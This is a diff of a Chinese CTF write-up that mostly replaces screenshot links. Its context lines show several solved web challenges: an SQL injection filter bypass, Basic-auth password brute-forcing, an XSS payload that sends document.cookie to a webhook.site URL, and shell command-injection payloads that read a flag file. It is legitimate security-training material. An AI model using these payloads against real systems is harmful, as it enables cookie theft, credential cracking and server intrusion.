@@ -8,11 +8,14 @@ tags: [CTF]
 
 ## chiikawa_login_1
 F12裡有提示source code的位置 
-> ![image](https://hackmd.io/_uploads/BkHHk-cSyg.png)
+
+<img width="660" height="174" alt="image" src="https://github.com/user-attachments/assets/db7a9487-9c82-4629-899d-2ba9f2df90a5" />
+
 
 http://ctf.adl.tw:12003/?source
-> ![image](https://hackmd.io/_uploads/H1Wse-9Hye.png)
-> 
+
+<img width="889" height="815" alt="image" src="https://github.com/user-attachments/assets/be2fd072-a7bd-41a5-8a5b-55b6648ab99d" />
+
 
 ### 觀察程式碼可知
 **1. 原始查詢為：**
@@ -71,7 +74,9 @@ SELECT * FROM users WHERE `username` = '' UUNIONNION SSELECTELECT NULL,'Usagi','
 #### sqlmap
 一開始先嘗試sqlmap的方法
 (但這題似乎被禁用)
-![image](https://hackmd.io/_uploads/HkFk5RqB1g.png)
+
+<img width="1426" height="368" alt="image" src="https://github.com/user-attachments/assets/606084ff-b6cd-4d75-8d57-50f65afd571c" />
+
 
 #### blind SQL injection
 
@@ -141,62 +146,105 @@ while True:
 
 ## koduckkoduck
 我們查了一下這題的html碼發現有兩行不明的字串
-![螢幕擷取畫面 2024-12-26 231507](https://hackmd.io/_uploads/HyUEbZjSke.png)
+
+<img width="635" height="416" alt="image" src="https://github.com/user-attachments/assets/7bcadd81-1d9f-4c2c-926d-d639ba0de329" />
+
 分別對兩者進行base64解密後得到了以下資訊
-![螢幕擷取畫面 2024-12-26 231514](https://hackmd.io/_uploads/rJPEWbsrkl.png)
-![螢幕擷取畫面 2024-12-26 231543](https://hackmd.io/_uploads/rJDNZ-irke.png)
+
+<img width="381" height="448" alt="image" src="https://github.com/user-attachments/assets/7e1df341-5358-4447-836d-5b4669641651" />
+
+<img width="381" height="448" alt="image" src="https://github.com/user-attachments/assets/e06f4baf-1f07-42cf-af77-e8ebeeb70c13" />
+
+<img width="622" height="443" alt="image" src="https://github.com/user-attachments/assets/6cf95e68-725d-4302-840b-6280bc67fbf1" />
+
+
 用burp suite抓網頁，然後用repeater，送request，看到在response中的set-cookie這邊也有不明字串
-![螢幕擷取畫面 2024-12-26 230840](https://hackmd.io/_uploads/ByNMb-jS1g.png)
+<img width="1145" height="489" alt="image" src="https://github.com/user-attachments/assets/44794690-22d5-43fd-aba3-df143077aae3" />
+
 透過以上的資訊有兩種方法可以解決，使用curl找flag，或是看到flag底下又有一個_flag，Decode就得到
 **flag:** `ADLCTF{C0Okie_i5_yummy!KoduckK0dUCK}`
-![image](https://hackmd.io/_uploads/B14hLR5H1l.png)
 
+<img width="1434" height="411" alt="image" src="https://github.com/user-attachments/assets/6a6351c7-1316-435a-838f-f9bf891d53a1" />
 
-![螢幕擷取畫面 2024-12-26 211342](https://hackmd.io/_uploads/H1iTL05H1x.png)
+<img width="989" height="411" alt="image" src="https://github.com/user-attachments/assets/c791a5a4-90dc-4e0e-85bd-995afa45b094" />
 
 
 ## Subscribe
 這題大致上是照著網頁給的提示一步一步進行修改即可。
 首先透過GET並搭配以下header連上網頁。
-![螢幕擷取畫面 2024-12-12 201840](https://hackmd.io/_uploads/ry22EIuNJg.png)
+<img width="693" height="183" alt="image" src="https://github.com/user-attachments/assets/47ec1e53-7f2d-4a46-866c-24285c687a6b" />
+
 得到必須使用SUBSCRIBE method的提示。
-![upload_13d3872f62c82e2f87dba04aaea8d3b3](https://hackmd.io/_uploads/SJV7j1oHkx.png)
+
+<img width="534" height="181" alt="image" src="https://github.com/user-attachments/assets/db00bf38-7092-4faa-a23f-b41cfb1138ed" />
+
 
 修改method後
-![螢幕擷取畫面 2024-12-12 201945](https://hackmd.io/_uploads/HJtnFU_4Jg.png)
+
+<img width="695" height="187" alt="image" src="https://github.com/user-attachments/assets/69805ead-7479-4431-b710-fe792f0a8617" />
+
 會得到以下的頁面，提示需使用SAKUNA_Browser
-![upload_13d3872f62c82e2f87dba04aaea8d3b3](https://hackmd.io/_uploads/ByuDikirkx.png)
+
+<img width="538" height="183" alt="image" src="https://github.com/user-attachments/assets/08858a69-bf11-40db-a5ea-63bdb6699b6f" />
+
 
 我們可以去修改User-Agent達到這個要求
-![螢幕擷取畫面 2024-12-12 202051](https://hackmd.io/_uploads/H1gKnYIuEkx.png)
+
+<img width="694" height="168" alt="image" src="https://github.com/user-attachments/assets/51c71417-478c-4cc6-9599-4833092a26c3" />
+
 接續得到我們必須來自於`https://www.subscribesakuna.com`
-![upload_d67be4a9ae43a22a5fba68fb70fda296](https://hackmd.io/_uploads/r1SniyjSkl.png)
+
+<img width="537" height="183" alt="image" src="https://github.com/user-attachments/assets/54de82d0-81f3-4574-b600-8d56410dfa87" />
+
 
 原來是直接加上`FROM`的標頭但發現不正確，後來查詢資料發現要使用的是`Referer`標頭
-![螢幕擷取畫面 2024-12-12 202219](https://hackmd.io/_uploads/HJlFhFUdNkg.png)
+
+<img width="692" height="190" alt="image" src="https://github.com/user-attachments/assets/3d26194c-cdde-4bbe-ae24-c0ae26ef2050" />
+
 接續得到必須有特定的`Host`
-![upload_d67be4a9ae43a22a5fba68fb70fda296](https://hackmd.io/_uploads/Bk0XhysS1l.png)
+
+<img width="551" height="179" alt="image" src="https://github.com/user-attachments/assets/e0fef79e-eb00-4c12-8d85-764a1a07d2b3" />
+
 
 同樣在標頭加入對應的`Host`
-![螢幕擷取畫面 2024-12-12 202257](https://hackmd.io/_uploads/SJlthtLuVke.png)
+
+<img width="697" height="184" alt="image" src="https://github.com/user-attachments/assets/2579f538-7639-48b6-87aa-360dcb48fa4e" />
+
+
 後來得到需要特定`cookie`的提示
-![upload_d67be4a9ae43a22a5fba68fb70fda296](https://hackmd.io/_uploads/r1_qhyoSyx.png)
+
+<img width="534" height="197" alt="image" src="https://github.com/user-attachments/assets/2a9d81f2-625e-4cd3-b78c-c4a06c00cb9a" />
+
 
 我們可以透過`Cookie: name=value`進行設定
-![螢幕擷取畫面 2024-12-12 202354](https://hackmd.io/_uploads/rkY2tUd4ke.png)
+
+<img width="696" height="198" alt="image" src="https://github.com/user-attachments/assets/682abaac-6a94-48ed-a62a-28323eeebb03" />
+
 終於到了準備登入的畫面，在這邊有提示我們可以透過`darkweb2017-top10000.txt`這個檔案進行暴力破解
-![upload_d67be4a9ae43a22a5fba68fb70fda296](https://hackmd.io/_uploads/HJRRhJiByx.png)
+
+<img width="532" height="269" alt="image" src="https://github.com/user-attachments/assets/f0ea11e0-6d36-427d-9d4e-97d24fe608e2" />
+
 
 讓我們先直接access`/admin`看看會得到甚麼結果
-![螢幕擷取畫面 2024-12-12 202438](https://hackmd.io/_uploads/BJYnKIONkl.png)
+
+<img width="692" height="196" alt="image" src="https://github.com/user-attachments/assets/59893f76-3622-42ff-8520-20e01aac2798" />
+
 可以發現這裡有兩個訊息，一個是需要使用`Basic`這個驗證方式
-![螢幕擷取畫面 2024-12-12 202446](https://hackmd.io/_uploads/rJFnFUuNkl.png)
+
+<img width="481" height="109" alt="image" src="https://github.com/user-attachments/assets/b1142110-6dc7-4a3d-9813-9758fda9fc14" />
+
 另一個是驗證當中需要有輸入`username`與`password`
-![螢幕擷取畫面 2024-12-12 202459](https://hackmd.io/_uploads/HyeKhKIdVJe.png)
+
+<img width="538" height="196" alt="image" src="https://github.com/user-attachments/assets/399d06a2-460d-4402-a45e-814b13443529" />
+
 查詢了有關basic驗證的方法，提到我們需要在標頭加入`Authorization: Basic <credentials>`，並且其中的`<credentials>`是透過`<username>:<password>`再進行`base64`的編碼組成。
-![1735220103730](https://hackmd.io/_uploads/Bk42oA9r1g.jpg)
+
+<img width="728" height="436" alt="image" src="https://github.com/user-attachments/assets/7d666758-775a-4652-8dc2-d1399c9a7330" />
+
 原先我們預計使用`Burp Intruder`進行暴力破解，但發現免費版會有速度限制...
-![螢幕擷取畫面 2024-12-12 202751](https://hackmd.io/_uploads/BybYnFUdEkx.png)
+
+<img width="1363" height="830" alt="image" src="https://github.com/user-attachments/assets/4ac51355-2368-4c55-8e8d-fb5f8fc2aedf" />
+
 因此我們自行開發了python script暴力破解密碼
 ```python
 import base64
@@ -256,10 +304,15 @@ with open("./darkweb2017-top10000.txt", "r", encoding="utf-8") as f:
 print("Password cracking completed.")
 ```
 因為在破解當中發現伺服器每隔一段時間(一定量的request？)就會timeout使得破解無法繼續，所以使用了`try except`的方式如果抓到`Timeout`就休息一段時間在繼續。
-![螢幕擷取畫面 2024-12-12 202827](https://hackmd.io/_uploads/H1YhYUOVkl.png)
-![螢幕擷取畫面 2024-12-12 202853](https://hackmd.io/_uploads/S1KhFUdVJx.png)
+
+<img width="314" height="137" alt="image" src="https://github.com/user-attachments/assets/e50a4868-70c9-4720-8e14-09c757e1f8dc" />
+
+<img width="189" height="528" alt="image" src="https://github.com/user-attachments/assets/c64b64ff-15fc-4344-9a19-8bdcd00a933b" />
+
 最後我們使用了以下的header成功登入了`sakuna`
-![螢幕擷取畫面 2024-12-12 203336](https://hackmd.io/_uploads/HkY3Y8OVkg.png)
+
+<img width="696" height="240" alt="image" src="https://github.com/user-attachments/assets/8530cef4-12a4-451f-a4d9-1ecfd5aa81e9" />
+
 ```
 SUBSCRIBE /admin HTTP/1.1
 Host: sakuna.com
@@ -275,7 +328,9 @@ Connection: keep-alive
 Cookie: sakuna=kawaiiiiiiiiiiiiiiiiiiiiiiYAHA
 ```
 以下是存在其中的flag
-![螢幕擷取畫面 2024-12-13 215922](https://hackmd.io/_uploads/Sy4RT3Y4yl.png)
+
+<img width="923" height="215" alt="image" src="https://github.com/user-attachments/assets/97035a60-c723-4e48-af8b-3a5c43788bc7" />
+
 **flag**:`ADLCTF{s4kuNA_kAWA11_5uBSCR1Be_https://youtube.com/channel/UCrV1Hf5r8P148idjoSfrGEQ?si=ksHGQgL0ar79DH5Q}`
 
 
@@ -327,39 +382,42 @@ URL：https://webhook.site/28abc064-fe98-471b-adee-30683a249f8c/
 <image src=x onerror="fetch('https://webhook.site/28abc064-fe98-471b-adee-30683a249f8c/?'+document.cookie)">
 ```
 > 使用 [https://webhook.site/](https://)
-> ![image](https://hackmd.io/_uploads/ByXmZf5SJl.png)
+> <img width="1912" height="870" alt="image" src="https://github.com/user-attachments/assets/439fb26c-2c01-4317-b372-04f06e22e291" />
 > 
 **flag:** `ADLCTF{s@kuNa_D@!5uk!_No_5MokiN9}`
 ## Pokedex
 有了前面的經驗，一樣先找看看source code
 http://ctf.adl.tw:12005/?source
 
-> ![image](https://hackmd.io/_uploads/SJYTa0cB1x.png)
+> <img width="779" height="608" alt="image" src="https://github.com/user-attachments/assets/f25da59d-780c-4fb9-9f80-913898628bd7" />
+
 
 常見指令符號都在blacklist裡面，但還是有可以用的
 像`$`，`cat` 可改成 `tac`，flag 可嘗試 `f1ag` 或 `f[l]ag`，一開始嘗試 `{"number":"001"}`
 後面接的指令都被當作字串
 
 本來以為會直接打出flag，結果意外發現能和圖片一起嵌入指令
-> ![image](https://hackmd.io/_uploads/S1N4yJsSke.png)
+> <img width="436" height="400" alt="image" src="https://github.com/user-attachments/assets/ec07a173-c960-4c9d-8230-dab0652ca892" />
+
 
 將單引號正確插入`{"number":"001'$(ls )'"}`，結束字串後讓'$(ls ..)'不會被當成字串
 `ls`命令，列出當前目錄中的檔案，顯示目錄中的文件
-> ![image](https://hackmd.io/_uploads/SJoveJoSJl.png)
+> <img width="635" height="464" alt="image" src="https://github.com/user-attachments/assets/650647c6-8194-473c-a9b8-ae1161e8b52c" />
+
 `"001index.php koduck.gif koduck_dance.gif koduck_scream.gif koduck_turnaround.gif pokedex_images"`
 
 玩玩看，找flag放在哪
-> ![image](https://hackmd.io/_uploads/BkHdbJiryl.png)
+> <img width="649" height="445" alt="image" src="https://github.com/user-attachments/assets/ad6fb811-8c20-42a7-b2c9-07fb42adc7f5" />
 
 `{"number":"001'$(ls pokedex_images)'"}`
-> ![image](https://hackmd.io/_uploads/S1nAGJiB1l.png)
+> <img width="637" height="459" alt="image" src="https://github.com/user-attachments/assets/7964ddf4-b597-4b1d-81f6-612c55ec0b40" />
 
 `{"number":"001'$(ls /)'"}`
-> ![image](https://hackmd.io/_uploads/B1GG4yjH1g.png)
+> <img width="631" height="467" alt="image" src="https://github.com/user-attachments/assets/b69cbca7-8ae7-4504-8ccb-456019d8d051" />
 
 找到flag目錄
 `{"number":"001'$(tac /f[l]ag)'"}`
-> ![image](https://hackmd.io/_uploads/S1kINysB1g.png)
+> <img width="633" height="448" alt="image" src="https://github.com/user-attachments/assets/27337bdf-fe7c-4a39-8d28-1b35f6230c9f" />
 
 **flag:** `ADL{CMD_1njECT!0n_By_koDuck}`
 
